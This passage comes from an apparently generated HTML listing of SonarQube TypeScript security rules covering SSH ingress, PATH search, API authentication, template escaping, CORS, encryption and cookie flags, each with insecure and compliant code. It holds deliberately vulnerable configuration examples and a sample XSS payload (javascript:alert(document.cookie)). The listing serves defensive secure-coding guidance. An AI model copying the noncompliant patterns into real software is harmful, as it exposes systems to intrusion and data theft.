import {aws_ec2 as ec2} from 'aws-cdk-lib'

const rdsSubnetGroupPrivate = new rds.CfnDBSubnetGroup(this, "example",{
    dbSubnetGroupDescription: "Subnets",
    dbSubnetGroupName: "privateSn",
    subnetIds: vpc.selectSubnets({
        subnetType: ec2.SubnetType.PRIVATE_WITH_EGRESS
    }).subnetIds
})

new rds.CfnDBInstance(this, "example", {
    engine: "postgres",
    masterUsername: "foobar",
    masterUserPassword: "12345678",
    dbInstanceClass: "db.r5.large",
    allocatedStorage: "200",
    iops: 1000,
    dbSubnetGroupName: rdsSubnetGroupPrivate.ref,
    publiclyAccessible: false,
    vpcSecurityGroups: [sg.securityGroupId]
})
</pre>
<h2>See</h2>
<ul>
  <li> <a href="https://docs.aws.amazon.com/AWSEC2/latest/UserGuide/using-instance-addressing.html">AWS Documentation</a> - Amazon EC2 instance IP
  addressing </li>
  <li> <a href="https://docs.aws.amazon.com/dms/latest/userguide/CHAP_ReplicationInstance.PublicPrivate.html">AWS Documentation</a> - Public and
  private replication instances </li>
  <li> <a href="https://docs.aws.amazon.com/vpc/latest/peering/what-is-vpc-peering.html">AWS Documentation</a> - VPC Peering </li>
  <li> CWE - <a href="https://cwe.mitre.org/data/definitions/284">CWE-284 - Improper Access Control</a> </li>
  <li> CWE - <a href="https://cwe.mitre.org/data/definitions/668">CWE-668 - Exposure of Resource to Wrong Sphere</a> </li>
</ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=typescript:S6321">
              typescript:S6321
            </a>
          </td>
          <td>
            <details>
              <h2>Why is this an issue?</h2>
<p>Cloud platforms such as AWS, Azure, or GCP support virtual firewalls that can be used to restrict access to services by controlling inbound and
outbound traffic.<br> Any firewall rule allowing traffic from all IP addresses to standard network ports on which administration services
traditionally listen, such as 22 for SSH, can expose these services to exploits and unauthorized access.</p>
<h3>What is the potential impact?</h3>
<p>Like any other service, administration services can contain vulnerabilities. Administration services run with elevated privileges and thus a
vulnerability could have a high impact on the system.</p>
<p>Additionally, credentials might be leaked through phishing or similar techniques. Attackers who are able to reach the services could use the
credentials to log in to the system.</p>
<h2>How to fix it</h2>
<p>It is recommended to restrict access to remote administration services to only trusted IP addresses. In practice, trusted IP addresses are those
held by system administrators or those of <a href="https://aws.amazon.com/quickstart/architecture/linux-bastion/?nc1=h_ls">bastion-like</a>
servers.</p>
<h3>Code examples</h3>
<h4>Noncompliant code example</h4>
<p>For <a href="https://docs.aws.amazon.com/cdk/api/v2/docs/aws-cdk-lib.aws_ec2.Instance.html">aws-cdk-lib.aws_ec2.Instance</a> and other constructs
that support a <code>connections</code> attribute:</p>
<pre data-diff-id="1" data-diff-type="noncompliant">
import {aws_ec2 as ec2} from 'aws-cdk-lib'

const instance = new ec2.Instance(this, "default-own-security-group",{
    instanceType: nanoT2,
    machineImage: ec2.MachineImage.latestAmazonLinux(),
    vpc: vpc,
    instanceName: "test-instance"
})

instance.connections.allowFrom(
    ec2.Peer.anyIpv4(), // Noncompliant
    ec2.Port.tcp(22),
    /*description*/ "Allows SSH from all IPv4"
)
</pre>
<p>For <a href="https://docs.aws.amazon.com/cdk/api/v2/docs/aws-cdk-lib.aws_ec2.SecurityGroup.html">aws-cdk-lib.aws_ec2.SecurityGroup</a></p>
<pre data-diff-id="2" data-diff-type="noncompliant">
import {aws_ec2 as ec2} from 'aws-cdk-lib'

const securityGroup = new ec2.SecurityGroup(this, "custom-security-group", {
    vpc: vpc
})

securityGroup.addIngressRule(
    ec2.Peer.anyIpv4(), // Noncompliant
    ec2.Port.tcpRange(1, 1024)
)
</pre>
<p>For <a href="https://docs.aws.amazon.com/cdk/api/v2/docs/aws-cdk-lib.aws_ec2.CfnSecurityGroup.html">aws-cdk-lib.aws_ec2.CfnSecurityGroup</a></p>
<pre data-diff-id="3" data-diff-type="noncompliant">
import {aws_ec2 as ec2} from 'aws-cdk-lib'

new ec2.CfnSecurityGroup(
    this,
    "cfn-based-security-group", {
        groupDescription: "cfn based security group",
        groupName: "cfn-based-security-group",
        vpcId: vpc.vpcId,
        securityGroupIngress: [
            {
                ipProtocol: "6",
                cidrIp: "0.0.0.0/0", // Noncompliant
                fromPort: 22,
                toPort: 22
            }
        ]
    }
)
</pre>
<p>For <a
href="https://docs.aws.amazon.com/cdk/api/v2/docs/aws-cdk-lib.aws_ec2.CfnSecurityGroupIngress.html">aws-cdk-lib.aws_ec2.CfnSecurityGroupIngress</a></p>
<pre data-diff-id="4" data-diff-type="noncompliant">
import {aws_ec2 as ec2} from 'aws-cdk-lib'

new ec2.CfnSecurityGroupIngress( // Noncompliant
    this,
    "ingress-all-ip-tcp-ssh", {
        ipProtocol: "tcp",
        cidrIp: "0.0.0.0/0",
        fromPort: 22,
        toPort: 22,
        groupId: securityGroup.attrGroupId
})
</pre>
<h4>Compliant solution</h4>
<p>For <a href="https://docs.aws.amazon.com/cdk/api/v2/docs/aws-cdk-lib.aws_ec2.Instance.html">aws-cdk-lib.aws_ec2.Instance</a> and other constructs
that support a <code>connections</code> attribute:</p>
<pre data-diff-id="1" data-diff-type="compliant">
import {aws_ec2 as ec2} from 'aws-cdk-lib'

const instance = new ec2.Instance(this, "default-own-security-group",{
    instanceType: nanoT2,
    machineImage: ec2.MachineImage.latestAmazonLinux(),
    vpc: vpc,
    instanceName: "test-instance"
})

instance.connections.allowFrom(
    ec2.Peer.ipv4("192.0.2.0/24"),
    ec2.Port.tcp(22),
    /*description*/ "Allows SSH from a trusted range"
)
</pre>
<p>For <a href="https://docs.aws.amazon.com/cdk/api/v2/docs/aws-cdk-lib.aws_ec2.SecurityGroup.html">aws-cdk-lib.aws_ec2.SecurityGroup</a></p>
<pre data-diff-id="2" data-diff-type="compliant">
import {aws_ec2 as ec2} from 'aws-cdk-lib'

const securityGroup3 = new ec2.SecurityGroup(this, "custom-security-group", {
    vpc: vpc
})

securityGroup3.addIngressRule(
    ec2.Peer.anyIpv4(),
    ec2.Port.tcpRange(1024, 1048)
)
</pre>
<p>For <a href="https://docs.aws.amazon.com/cdk/api/v2/docs/aws-cdk-lib.aws_ec2.CfnSecurityGroup.html">aws-cdk-lib.aws_ec2.CfnSecurityGroup</a></p>
<pre data-diff-id="3" data-diff-type="compliant">
import {aws_ec2 as ec2} from 'aws-cdk-lib'

new ec2.CfnSecurityGroup(
    this,
    "cfn-based-security-group", {
        groupDescription: "cfn based security group",
        groupName: "cfn-based-security-group",
        vpcId: vpc.vpcId,
        securityGroupIngress: [
            {
                ipProtocol: "6",
                cidrIp: "192.0.2.0/24",
                fromPort: 22,
                toPort: 22
            }
        ]
    }
)
</pre>
<p>For <a
href="https://docs.aws.amazon.com/cdk/api/v2/docs/aws-cdk-lib.aws_ec2.CfnSecurityGroupIngress.html">aws-cdk-lib.aws_ec2.CfnSecurityGroupIngress</a></p>
<pre data-diff-id="4" data-diff-type="compliant">
new ec2.CfnSecurityGroupIngress(
    this,
    "ingress-all-ipv4-tcp-http", {
        ipProtocol: "6",
        cidrIp: "0.0.0.0/0",
        fromPort: 80,
        toPort: 80,
        groupId: securityGroup.attrGroupId
    }
)
</pre>
<h2>Resources</h2>
<h3>Documentation</h3>
<ul>
  <li> <a href="https://docs.aws.amazon.com/vpc/latest/userguide/VPC_SecurityGroups.html">AWS Documentation</a> - Security groups for your VPC </li>
  <li> <a href="https://docs.microsoft.com/en-us/azure/virtual-network/network-security-groups-overview">Azure Documentation</a> - Network security
  groups </li>
  <li> <a href="https://cloud.google.com/vpc/docs/using-firewalls">GCP Documentation</a> - Firewalls </li>
</ul>
<h3>Standards</h3>
<ul>
  <li> CWE - <a href="https://cwe.mitre.org/data/definitions/284">CWE-284 - Improper Access Control</a> </li>
</ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=typescript:S4036">
              typescript:S4036
            </a>
          </td>
          <td>
            <details>
              <p>When executing an OS command and unless you specify the full path to the executable, then the locations in your application’s <code>PATH</code>
environment variable will be searched for the executable. That search could leave an opening for an attacker if one of the elements in
<code>PATH</code> is a directory under his control.</p>
<h2>Ask Yourself Whether</h2>
<ul>
  <li> The directories in the PATH environment variable may be defined by not trusted entities. </li>
</ul>
<p>There is a risk if you answered yes to this question.</p>
<h2>Recommended Secure Coding Practices</h2>
<p>Fully qualified/absolute path should be used to specify the OS command to execute.</p>
<h2>Sensitive Code Example</h2>
<pre>
const cp = require('child_process');
cp.exec('file.exe'); // Sensitive
</pre>
<h2>Compliant Solution</h2>
<pre>
const cp = require('child_process');
cp.exec('/usr/bin/file.exe'); // Compliant
</pre>
<h2>See</h2>
<ul>
  <li> OWASP - <a href="https://owasp.org/Top10/A08_2021-Software_and_Data_Integrity_Failures/">Top 10 2021 Category A8 - Software and Data Integrity
  Failures</a> </li>
  <li> OWASP - <a href="https://owasp.org/www-project-top-ten/2017/A1_2017-Injection">Top 10 2017 Category A1 - Injection</a> </li>
  <li> CWE - <a href="https://cwe.mitre.org/data/definitions/426">CWE-426 - Untrusted Search Path</a> </li>
  <li> CWE - <a href="https://cwe.mitre.org/data/definitions/427">CWE-427 - Uncontrolled Search Path Element</a> </li>
</ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=typescript:S6333">
              typescript:S6333
            </a>
          </td>
          <td>
            <details>
              <p>Creating APIs without authentication unnecessarily increases the attack surface on the target infrastructure.</p>
<p>Unless another authentication method is used, attackers have the opportunity to attempt attacks against the underlying API.<br> This means attacks
both on the functionality provided by the API and its infrastructure.</p>
<h2>Ask Yourself Whether</h2>
<ul>
  <li> The underlying API exposes all of its contents to any anonymous Internet user. </li>
</ul>
<p>There is a risk if you answered yes to this question.</p>
<h2>Recommended Secure Coding Practices</h2>
<p>In general, prefer limiting API access to a specific set of people or entities.</p>
<p>AWS provides multiple methods to do so:</p>
<ul>
  <li> <code>AWS_IAM</code>, to use standard AWS IAM roles and policies. </li>
  <li> <code>COGNITO_USER_POOLS</code>, to use customizable OpenID Connect (OIDC) identity providers (IdP). </li>
  <li> <code>CUSTOM</code>, to use an AWS-independant OIDC provider, glued to the infrastructure with a Lambda authorizer. </li>
</ul>
<h2>Sensitive Code Example</h2>
<p>For <a href="https://docs.aws.amazon.com/cdk/api/v2/docs/aws-cdk-lib.aws_apigateway.Resource.html">aws-cdk-lib.aws_apigateway.Resource</a>:</p>
<pre>
import {aws_apigateway as apigateway} from "aws-cdk-lib"

const resource = api.root.addResource("example")
resource.addMethod(
    "GET",
    new apigateway.HttpIntegration("https://example.org"),
    {
        authorizationType: apigateway.AuthorizationType.NONE // Sensitive
    }
)
</pre>
<p>For <a href="https://docs.aws.amazon.com/cdk/api/v2/docs/aws-cdk-lib.aws_apigatewayv2.CfnRoute.html">aws-cdk-lib.aws_apigatewayv2.CfnRoute</a>:</p>
<pre>
import {aws_apigatewayv2 as apigateway} from "aws-cdk-lib"

new apigateway.CfnRoute(this, "no-auth", {
    apiId: api.ref,
    routeKey: "GET /no-auth",
    authorizationType: "NONE", // Sensitive
    target: exampleIntegration
})
</pre>
<h2>Compliant Solution</h2>
<p>For <a href="https://docs.aws.amazon.com/cdk/api/v2/docs/aws-cdk-lib.aws_apigateway.Resource.html">aws-cdk-lib.aws_apigateway.Resource</a>:</p>
<pre>
import {aws_apigateway as apigateway} from "aws-cdk-lib"

const resource = api.root.addResource("example",{
    defaultMethodOptions:{
        authorizationType: apigateway.AuthorizationType.IAM
    }
})
resource.addMethod(
    "POST",
    new apigateway.HttpIntegration("https://example.org"),
    {
        authorizationType: apigateway.AuthorizationType.IAM
    }
)
resource.addMethod(  // authorizationType is inherited from the Resource's configured defaultMethodOptions
    "GET"
)
</pre>
<p>For <a href="https://docs.aws.amazon.com/cdk/api/v2/docs/aws-cdk-lib.aws_apigatewayv2.CfnRoute.html">aws-cdk-lib.aws_apigatewayv2.CfnRoute</a>:</p>
<pre>
import {aws_apigatewayv2 as apigateway} from "aws-cdk-lib"

new apigateway.CfnRoute(this, "auth", {
    apiId: api.ref,
    routeKey: "POST /auth",
    authorizationType: "AWS_IAM",
    target: exampleIntegration
})
</pre>
<h2>See</h2>
<ul>
  <li> <a href="https://docs.aws.amazon.com/apigateway/latest/developerguide/apigateway-control-access-to-api.html">AWS Documentation</a> -
  Controlling and managing access to a REST API in API Gateway </li>
  <li> CWE - <a href="https://cwe.mitre.org/data/definitions/284">CWE-284 - Improper Access Control</a> </li>
</ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=typescript:S5247">
              typescript:S5247
            </a>
          </td>
          <td>
            <details>
              <p>To reduce the risk of cross-site scripting attacks, templating systems, such as <code>Twig</code>, <code>Django</code>, <code>Smarty</code>,
<code>Groovy's template engine</code>, allow configuration of automatic variable escaping before rendering templates. When escape occurs, characters
that make sense to the browser (eg: &lt;a&gt;) will be transformed/replaced with escaped/sanitized values (eg: &amp; lt;a&amp; gt; ).</p>
<p>Auto-escaping is not a magic feature to annihilate all cross-site scripting attacks, it depends on <a
href="https://twig.symfony.com/doc/3.x/filters/escape.html">the strategy applied</a> and the context, for example a "html auto-escaping" strategy
(which only transforms html characters into <a href="https://developer.mozilla.org/en-US/docs/Glossary/Entity">html entities</a>) will not be relevant
when variables are used in a <a href="https://en.wikipedia.org/wiki/HTML_attribute">html attribute</a> because '<code>:</code>' character is not
escaped and thus an attack as below is possible:</p>
<pre>
&lt;a href="{{ myLink }}"&gt;link&lt;/a&gt; // myLink = javascript:alert(document.cookie)
&lt;a href="javascript:alert(document.cookie)"&gt;link&lt;/a&gt; // JS injection (XSS attack)
</pre>
<h2>Ask Yourself Whether</h2>
<ul>
  <li> Templates are used to render web content and
    <ul>
      <li> dynamic variables in templates come from untrusted locations or are user-controlled inputs </li>
      <li> there is no local mechanism in place to sanitize or validate the inputs. </li>
    </ul>  </li>
</ul>
<p>There is a risk if you answered yes to any of those questions.</p>
<h2>Recommended Secure Coding Practices</h2>
<p>Enable auto-escaping by default and continue to review the use of inputs in order to be sure that the chosen auto-escaping strategy is the right
one.</p>
<h2>Sensitive Code Example</h2>
<p><a href="https://www.npmjs.com/package/mustache">mustache.js</a> template engine:</p>
<pre>
let Mustache = require("mustache");

Mustache.escape = function(text) {return text;}; // Sensitive

let rendered = Mustache.render(template, { name: inputName });
</pre>
<p><a href="https://www.npmjs.com/package/handlebars">handlebars.js</a> template engine:</p>
<pre>
const Handlebars = require('handlebars');

let source = "&lt;p&gt;attack {{name}}&lt;/p&gt;";

let template = Handlebars.compile(source, { noEscape: true }); // Sensitive
</pre>
<p><a href="https://www.npmjs.com/package/markdown-it">markdown-it</a> markup language parser:</p>
<pre>
const markdownIt = require('markdown-it');
let md = markdownIt({
  html: true // Sensitive
});

let result = md.render('# &lt;b&gt;attack&lt;/b&gt;');
</pre>
<p><a href="https://www.npmjs.com/package/marked">marked</a> markup language parser:</p>
<pre>
const marked = require('marked');

marked.setOptions({
  renderer: new marked.Renderer(),
  sanitize: false // Sensitive
});

console.log(marked("# test &lt;b&gt;attack/b&gt;"));
</pre>
<p><a href="https://www.npmjs.com/package/kramed">kramed</a> markup language parser:</p>
<pre>
let kramed = require('kramed');

var options = {
  renderer: new kramed.Renderer({
    sanitize: false // Sensitive
  })
};
</pre>
<h2>Compliant Solution</h2>
<p><a href="https://www.npmjs.com/package/mustache">mustache.js</a> template engine:</p>
<pre>
let Mustache = require("mustache");

let rendered = Mustache.render(template, { name: inputName }); // Compliant autoescaping is on by default
</pre>
<p><a href="https://www.npmjs.com/package/handlebars">handlebars.js</a> template engine:</p>
<pre>
const Handlebars = require('handlebars');

let source = "&lt;p&gt;attack {{name}}&lt;/p&gt;";
let data = { "name": "&lt;b&gt;Alan&lt;/b&gt;" };

let template = Handlebars.compile(source); // Compliant by default noEscape is set to false
</pre>
<p><a href="https://www.npmjs.com/package/markdown-it">markdown-it</a> markup language parser:</p>
<pre>
let md = require('markdown-it')(); // Compliant by default html is set to false

let result = md.render('# &lt;b&gt;attack&lt;/b&gt;');
</pre>
<p><a href="https://www.npmjs.com/package/marked">marked</a> markup language parser:</p>
<pre>
const marked = require('marked');

marked.setOptions({
  renderer: new marked.Renderer()
}); // Compliant by default sanitize is set to true

console.log(marked("# test &lt;b&gt;attack/b&gt;"));
</pre>
<p><a href="https://www.npmjs.com/package/kramed">kramed</a> markup language parser:</p>
<pre>
let kramed = require('kramed');

let options = {
  renderer: new kramed.Renderer({
    sanitize: true // Compliant
  })
};

console.log(kramed('Attack [xss?](javascript:alert("xss")).', options));
</pre>
<h2>See</h2>
<ul>
  <li> OWASP - <a href="https://owasp.org/Top10/A03_2021-Injection/">Top 10 2021 Category A3 - Injection</a> </li>
  <li> <a href="https://github.com/OWASP/CheatSheetSeries/blob/master/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.md">OWASP Cheat
  Sheet</a> - XSS Prevention Cheat Sheet </li>
  <li> OWASP - <a href="https://owasp.org/www-project-top-ten/2017/A7_2017-Cross-Site_Scripting_(XSS)">Top 10 2017 Category A7 - Cross-Site Scripting
  (XSS)</a> </li>
  <li> CWE - <a href="https://cwe.mitre.org/data/definitions/79">CWE-79 - Improper Neutralization of Input During Web Page Generation ('Cross-site
  Scripting')</a> </li>
</ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=typescript:S6330">
              typescript:S6330
            </a>
          </td>
          <td>
            <details>
              <p>Amazon Simple Queue Service (SQS) is a managed message queuing service for application-to-application (A2A) communication. Amazon SQS can store
messages encrypted as soon as they are received. In the case that adversaries gain physical access to the storage medium or otherwise leak a message
from the file system, for example through a vulnerability in the service, they are not able to access the data.</p>
<h2>Ask Yourself Whether</h2>
<ul>
  <li> The queue contains sensitive data that could cause harm when leaked. </li>
  <li> There are compliance requirements for the service to store data encrypted. </li>
</ul>
<p>There is a risk if you answered yes to any of those questions.</p>
<h2>Recommended Secure Coding Practices</h2>
<p>It’s recommended to encrypt SQS queues that contain sensitive information. Encryption and decryption are handled transparently by SQS, so no
further modifications to the application are necessary.</p>
<h2>Sensitive Code Example</h2>
<p>For <a href="https://docs.aws.amazon.com/cdk/api/v2/docs/aws-cdk-lib.aws_sqs.Queue.html"><code>aws-cdk-lib.aws-sqs.Queue</code></a></p>
<pre>
import { Queue } from 'aws-cdk-lib/aws-sqs';

new Queue(this, 'example'); // Sensitive
</pre>
<p>For <a href="https://docs.aws.amazon.com/cdk/api/v2/docs/aws-cdk-lib.aws_sqs.CfnQueue.html"><code>aws-cdk-lib.aws-sqs.CfnQueue</code></a></p>
<pre>
import { CfnQueue } from 'aws-cdk-lib/aws-sqs';

new CfnQueue(this, 'example'); // Sensitive
</pre>
<h2>Compliant Solution</h2>
<p>For <a href="https://docs.aws.amazon.com/cdk/api/v2/docs/aws-cdk-lib.aws_sqs.Queue.html"><code>aws-cdk-lib.aws-sqs.Queue</code></a></p>
<pre>
import { Queue } from 'aws-cdk-lib/aws-sqs';

new Queue(this, 'example', {
    encryption: QueueEncryption.KMS_MANAGED
});
</pre>
<p>For <a href="https://docs.aws.amazon.com/cdk/api/v2/docs/aws-cdk-lib.aws_sqs.CfnQueue.html"><code>aws-cdk-lib.aws-sqs.CfnQueue</code></a></p>
<pre>
import { CfnQueue } from 'aws-cdk-lib/aws-sqs';

const encryptionKey = new Key(this, 'example', {
    enableKeyRotation: true,
});

new CfnQueue(this, 'example', {
    kmsMasterKeyId: encryptionKey.keyId
});
</pre>
<h2>See</h2>
<ul>
  <li> <a href="https://docs.aws.amazon.com/AWSSimpleQueueService/latest/SQSDeveloperGuide/sqs-server-side-encryption.html">AWS Documentation</a> -
  Encryption at rest </li>
  <li> CWE - <a href="https://cwe.mitre.org/data/definitions/311">CWE-311 - Missing Encryption of Sensitive Data</a> </li>
</ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=typescript:S5122">
              typescript:S5122
            </a>
          </td>
          <td>
            <details>
              <p>Having a permissive Cross-Origin Resource Sharing policy is security-sensitive. It has led in the past to the following vulnerabilities:</p>
<ul>
  <li> <a href="http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-0269">CVE-2018-0269</a> </li>
  <li> <a href="http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-14460">CVE-2017-14460</a> </li>
</ul>
<p><a href="https://developer.mozilla.org/en-US/docs/Web/Security/Same-origin_policy">Same origin policy</a> in browsers prevents, by default and for
security-reasons, a javascript frontend to perform a cross-origin HTTP request to a resource that has a different origin (domain, protocol, or port)
from its own. The requested target can append additional HTTP headers in response, called <a
href="https://developer.mozilla.org/en-US/docs/Web/HTTP/CORS">CORS</a>, that act like directives for the browser and change the access control policy
/ relax the same origin policy.</p>
<h2>Ask Yourself Whether</h2>
<ul>
  <li> You don’t trust the origin specified, example: <code>Access-Control-Allow-Origin: untrustedwebsite.com</code>. </li>
  <li> Access control policy is entirely disabled: <code>Access-Control-Allow-Origin: *</code> </li>
  <li> Your access control policy is dynamically defined by a user-controlled input like <a
  href="https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Origin"><code>origin</code></a> header. </li>
</ul>
<p>There is a risk if you answered yes to any of those questions.</p>
<h2>Recommended Secure Coding Practices</h2>
<ul>
  <li> The <code>Access-Control-Allow-Origin</code> header should be set only for a trusted origin and for specific resources. </li>
  <li> Allow only selected, trusted domains in the <code>Access-Control-Allow-Origin</code> header. Prefer whitelisting domains over blacklisting or
  allowing any domain (do not use * wildcard nor blindly return the <code>Origin</code> header content without any checks). </li>
</ul>
<h2>Sensitive Code Example</h2>
<p><a href="https://nodejs.org/api/http.html">nodejs http</a> built-in module:</p>
<pre>
const http = require('http');
const srv = http.createServer((req, res) =&gt; {
  res.writeHead(200, { 'Access-Control-Allow-Origin': '*' }); // Sensitive
  res.end('ok');
});
srv.listen(3000);
</pre>
<p><a href="https://www.npmjs.com/package/express">Express.js</a> framework with <a href="https://www.npmjs.com/package/cors">cors middleware</a>:</p>
<pre>
const cors = require('cors');

let app1 = express();
app1.use(cors()); // Sensitive: by default origin is set to *

let corsOptions = {
  origin: '*' // Sensitive
};

let app2 = express();
app2.use(cors(corsOptions));
</pre>
<p>User-controlled origin:</p>
<pre>
function (req, res) {
  const origin = req.header('Origin');
  res.setHeader('Access-Control-Allow-Origin', origin); // Sensitive
};
</pre>
<h2>Compliant Solution</h2>
<p><a href="https://nodejs.org/api/http.html">nodejs http</a> built-in module:</p>
<pre>
const http = require('http');
const srv = http.createServer((req, res) =&gt; {
  res.writeHead(200, { 'Access-Control-Allow-Origin': 'trustedwebsite.com' }); // Compliant
  res.end('ok');
});
srv.listen(3000);
</pre>
<p><a href="https://www.npmjs.com/package/express">Express.js</a> framework with <a href="https://www.npmjs.com/package/cors">cors middleware</a>:</p>
<pre>
const cors = require('cors');

let corsOptions = {
  origin: 'trustedwebsite.com' // Compliant
};

let app = express();
app.use(cors(corsOptions));
</pre>
<p>User-controlled origin validated with an allow-list:</p>
<pre>
function (req, res) {
  const origin = req.header('Origin');

  if (trustedOrigins.indexOf(origin) &gt;= 0) {
    res.setHeader('Access-Control-Allow-Origin', origin);
  }
};
</pre>
<h2>See</h2>
<ul>
  <li> OWASP - <a href="https://owasp.org/Top10/A05_2021-Security_Misconfiguration/">Top 10 2021 Category A5 - Security Misconfiguration</a> </li>
  <li> OWASP - <a href="https://owasp.org/Top10/A07_2021-Identification_and_Authentication_Failures/">Top 10 2021 Category A7 - Identification and
  Authentication Failures</a> </li>
  <li> <a href="https://developer.mozilla.org/en-US/docs/Web/HTTP/CORS">developer.mozilla.org</a> - CORS </li>
  <li> <a href="https://developer.mozilla.org/en-US/docs/Web/Security/Same-origin_policy">developer.mozilla.org</a> - Same origin policy </li>
  <li> OWASP - <a href="https://owasp.org/www-project-top-ten/2017/A6_2017-Security_Misconfiguration">Top 10 2017 Category A6 - Security
  Misconfiguration</a> </li>
  <li> <a href="https://cheatsheetseries.owasp.org/cheatsheets/HTML5_Security_Cheat_Sheet.html#cross-origin-resource-sharing">OWASP HTML5 Security
  Cheat Sheet</a> - Cross Origin Resource Sharing </li>
  <li> CWE - <a href="https://cwe.mitre.org/data/definitions/346">CWE-346 - Origin Validation Error</a> </li>
  <li> CWE - <a href="https://cwe.mitre.org/data/definitions/942">CWE-942 - Overly Permissive Cross-domain Whitelist</a> </li>
</ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=typescript:S6332">
              typescript:S6332
            </a>
          </td>
          <td>
            <details>
              <p>Amazon Elastic File System (EFS) is a serverless file system that does not require provisioning or managing storage. Stored files can be
automatically encrypted by the service. In the case that adversaries gain physical access to the storage medium or otherwise leak a message they are
not able to access the data.</p>
<h2>Ask Yourself Whether</h2>
<ul>
  <li> The file system contains sensitive data that could cause harm when leaked. </li>
  <li> There are compliance requirements for the service to store data encrypted. </li>
</ul>
<p>There is a risk if you answered yes to any of those questions.</p>
<h2>Recommended Secure Coding Practices</h2>
<p>It’s recommended to encrypt EFS file systems that contain sensitive information. Encryption and decryption are handled transparently by EFS, so no
further modifications to the application are necessary.</p>
<h2>Sensitive Code Example</h2>
<p>For <a href="https://docs.aws.amazon.com/cdk/api/v2/docs/aws-cdk-lib.aws_efs.FileSystem.html"><code>aws_cdk.aws_efs.FileSystem</code></a></p>
<pre>
import { FileSystem } from 'aws-cdk-lib/aws-efs';

new FileSystem(this, 'unencrypted-explicit', {
    vpc: new Vpc(this, 'VPC'),
    encrypted: false // Sensitive
});
</pre>
<p>For <a href="https://docs.aws.amazon.com/cdk/api/v2/docs/aws-cdk-lib.aws_efs.CfnFileSystem.html"><code>aws_cdk.aws_efs.CfnFileSystem</code></a></p>
<pre>
import { CfnFileSystem } from 'aws-cdk-lib/aws-efs';

new CfnFileSystem(this, 'unencrypted-implicit-cfn', {
}); // Sensitive as encryption is disabled by default
</pre>
<h2>Compliant Solution</h2>
<p>For <a href="https://docs.aws.amazon.com/cdk/api/v2/docs/aws-cdk-lib.aws_efs.FileSystem.html"><code>aws_cdk.aws_efs.FileSystem</code></a></p>
<pre>
import { FileSystem } from 'aws-cdk-lib/aws-efs';

new FileSystem(this, 'encrypted-explicit', {
    vpc: new Vpc(this, 'VPC'),
    encrypted: true
});
</pre>
<p>For <a href="https://docs.aws.amazon.com/cdk/api/v2/docs/aws-cdk-lib.aws_efs.CfnFileSystem.html"><code>aws_cdk.aws_efs.CfnFileSystem</code></a></p>
<pre>
import { CfnFileSystem } from 'aws-cdk-lib/aws-efs';

new CfnFileSystem(this, 'encrypted-explicit-cfn', {
    encrypted: true
});
</pre>
<h2>See</h2>
<ul>
  <li> <a href="https://docs.aws.amazon.com/efs/latest/ug/encryption.html">AWS Documentation</a> - Data encryption in Amazon EFS </li>
  <li> CWE - <a href="https://cwe.mitre.org/data/definitions/311">CWE-311 - Missing Encryption of Sensitive Data</a> </li>
</ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=typescript:S2092">
              typescript:S2092
            </a>
          </td>
          <td>
            <details>
              <p>When a cookie is protected with the <code>secure</code> attribute set to <em>true</em> it will not be send by the browser over an unencrypted HTTP
request and thus cannot be observed by an unauthorized person during a man-in-the-middle attack.</p>
<h2>Ask Yourself Whether</h2>
<ul>
  <li> the cookie is for instance a <em>session-cookie</em> not designed to be sent over non-HTTPS communication. </li>
  <li> it’s not sure that the website contains <a href="https://developer.mozilla.org/en-US/docs/Web/Security/Mixed_content">mixed content</a> or not
  (ie HTTPS everywhere or not) </li>
</ul>
<p>There is a risk if you answered yes to any of those questions.</p>
<h2>Recommended Secure Coding Practices</h2>
<ul>
  <li> It is recommended to use <code>HTTPs</code> everywhere so setting the <code>secure</code> flag to <em>true</em> should be the default behaviour
  when creating cookies. </li>
  <li> Set the <code>secure</code> flag to <em>true</em> for session-cookies. </li>
</ul>
<h2>Sensitive Code Example</h2>
<p><a href="https://www.npmjs.com/package/cookie-session">cookie-session</a> module:</p>
<pre>
let session = cookieSession({
  secure: false,// Sensitive
});  // Sensitive
</pre>
<p><a href="https://www.npmjs.com/package/express-session">express-session</a> module:</p>
<pre>
const express = require('express');
const session = require('express-session');

let app = express();
app.use(session({
  cookie:
  {
    secure: false // Sensitive
  }
}));
</pre>
<p><a href="https://www.npmjs.com/package/cookies">cookies</a> module:</p>
<pre>
let cookies = new Cookies(req, res, { keys: keys });

cookies.set('LastVisit', new Date().toISOString(), {
  secure: false // Sensitive
}); // Sensitive
</pre>
<p><a href="https://www.npmjs.com/package/csurf">csurf</a> module:</p>
<pre>
const cookieParser = require('cookie-parser');
const csrf = require('csurf');
const express = require('express');

let csrfProtection = csrf({ cookie: { secure: false }}); // Sensitive
</pre>
<h2>Compliant Solution</h2>
<p><a href="https://www.npmjs.com/package/cookie-session">cookie-session</a> module:</p>
<pre>
let session = cookieSession({
  secure: true,// Compliant
});  // Compliant
</pre>
<p><a href="https://www.npmjs.com/package/express-session">express-session</a> module:</p>
<pre>
const express = require('express');
const session = require('express-session');

let app = express();
app.use(session({
  cookie:
  {
    secure: true // Compliant
  }
}));
</pre>
<p><a href="https://www.npmjs.com/package/cookies">cookies</a> module:</p>
<pre>
let cookies = new Cookies(req, res, { keys: keys });

cookies.set('LastVisit', new Date().toISOString(), {
  secure: true // Compliant
}); // Compliant
</pre>
<p><a href="https://www.npmjs.com/package/csurf">csurf</a> module:</p>
<pre>
const cookieParser = require('cookie-parser');
const csrf = require('csurf');
